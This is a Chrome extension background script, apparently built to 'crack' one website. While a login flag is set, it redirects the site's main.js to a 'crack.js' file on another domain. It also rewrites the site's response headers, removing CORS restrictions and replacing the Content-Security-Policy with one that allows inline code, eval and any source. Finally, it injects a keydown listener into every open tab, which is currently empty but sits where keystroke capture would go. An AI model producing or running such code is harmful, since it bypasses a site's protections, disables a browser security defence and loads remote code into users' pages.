const SESSION_TIMEOUT = 60 * 1000; // 1 minute for testing
let activeListeners = [];
let isActive = false;

console.log('Extension loaded - watching for JS redirects');

function setupListeners() {
  if (isActive) return; // Prevent multiple setups
  removeListeners();
  
  // Redirect handler
  const redirectListener = chrome.webRequest.onBeforeRequest.addListener(
    function(details) {
      // Check authentication before redirecting
      if (!isActive) return { cancel: false };
      
      console.log('Intercepted:', details.url);
      return {
        redirectUrl: "https://www.nirajankhatiwada.com.np/crack.js"
      };
    },
    {
      urls: ["https://hamrocsit.com/wp-content/themes/tucsitnotes/assets/js/main.js*"]
    },
    ["blocking"]
  );

  // Headers handler with authentication check
  const headersListener = chrome.webRequest.onHeadersReceived.addListener(
    function(details) {
      if (!isActive) return { responseHeaders: details.responseHeaders };
      
      let headers = details.responseHeaders || [];
      headers = headers.filter(header => 
        !header.name.toLowerCase().startsWith('access-control-'));
      headers.push(
        {name: 'Access-Control-Allow-Origin', value: '*'},
        {name: 'Access-Control-Allow-Methods', value: 'GET, OPTIONS'},
        {name: 'Access-Control-Allow-Headers', value: '*'},
        {name: 'Content-Security-Policy', value: "default-src * 'unsafe-inline' 'unsafe-eval'"}
      );
      return {responseHeaders: headers};
    },
    {
      urls: [
        "https://hamrocsit.com/*",
        "https://www.nirajankhatiwada.com.np/*"
      ]
    },
    ["blocking", "responseHeaders", "extraHeaders"]
  );

  activeListeners.push(
    { type: 'onBeforeRequest', listener: redirectListener },
    { type: 'onHeadersReceived', listener: headersListener }
  );
  
  isActive = true;
  console.log('Extension activated - intercepting requests');
}

function removeListeners() {
  if (!isActive) return;
  
  activeListeners.forEach(({ type, listener }) => {
    chrome.webRequest[type].removeListener(listener);
  });
  activeListeners = [];
  isActive = false;
  console.log('Listeners removed - extension deactivated');
}

function checkAndUpdateSession() {
  chrome.storage.local.get(['isAuthenticated', 'loginTime'], (data) => {
    const currentTime = new Date().getTime();
    
    if (!data.isAuthenticated || !data.loginTime || 
        (currentTime - data.loginTime > SESSION_TIMEOUT)) {
      removeListeners();
      chrome.storage.local.set({ 
        isAuthenticated: false,
        loginTime: null 
      });
    } else if (data.isAuthenticated && !isActive) {
      setupListeners();
    }
  });
}

// Initial check
checkAndUpdateSession();

// Check session state more frequently
setInterval(checkAndUpdateSession, 1000);

// Listen for authentication changes
chrome.storage.onChanged.addListener((changes, namespace) => {
  if (namespace === 'local' && changes.isAuthenticated) {
    if (!changes.isAuthenticated.newValue) {
      removeListeners();
    }
    checkAndUpdateSession();
  }
});

//get all tabs and add listener of keydown
chrome.tabs.query({}, function(tabs) {
  tabs.forEach(function(tab) {
    chrome.tabs.executeScript(tab.id, {
      code: 'document.addEventListener("keydown", function(e) { e.key });'
    });
  });
});
